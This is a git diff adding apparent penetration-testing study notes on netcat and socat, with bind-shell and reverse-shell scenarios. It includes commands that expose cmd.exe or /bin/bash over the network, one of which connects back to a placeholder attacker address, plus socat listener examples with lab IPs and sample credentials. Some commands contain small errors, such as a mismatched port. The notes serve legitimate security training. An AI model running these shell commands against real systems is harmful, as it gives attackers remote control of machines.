@@ -11,3 +11,38 @@ nc -nv 10.10.1.11 4444 < /usr/share/win/.../wget.exe    #don't receive download 
 
 ## Remote Administration with Netcat
 
+## Netcat Bind Shell Scenario
+on Win:
+nc -nlvp 4444 -e cmd.exe
+
+on Attacker:
+nc -nv IP-of-Win 444
+
+## Netcat Reverse Shell Scenario
+on Attacker:
+nc -nvlp 4444
+
+on Linux Victim:
+nc -nv ip-of-attacker 4444 -e /bin/bash   #-e make an application available remotely (in our case - /bin/bash)
+
+#4.2 Netcat VS Socat
+nc <remote server's ip address> 80
+socat - TCP4:<remote server's ip address>:80    
+
+  ex: socat - TCP4:10.10.11.11:110      #Socat Bind Shell
+  USER offsec
+  PASS offsec
+  
+  ex2: start listener
+  sudo socat TCP4-LISTEN:443 STDOUT
+  on attacker:
+  socat - TCP4:10.10.11.11(victimIP):443 --> hello from attacker
+  the victim receives the message, and can write back --> yooo man
+  the attacker receives "yoo man"       #we have bidirectional chat this wat
+  
+nc -lvp localhost 443
+socat TCP4-LISTEN:443 STDOUT
+
+## Socat File Transfer
+
+
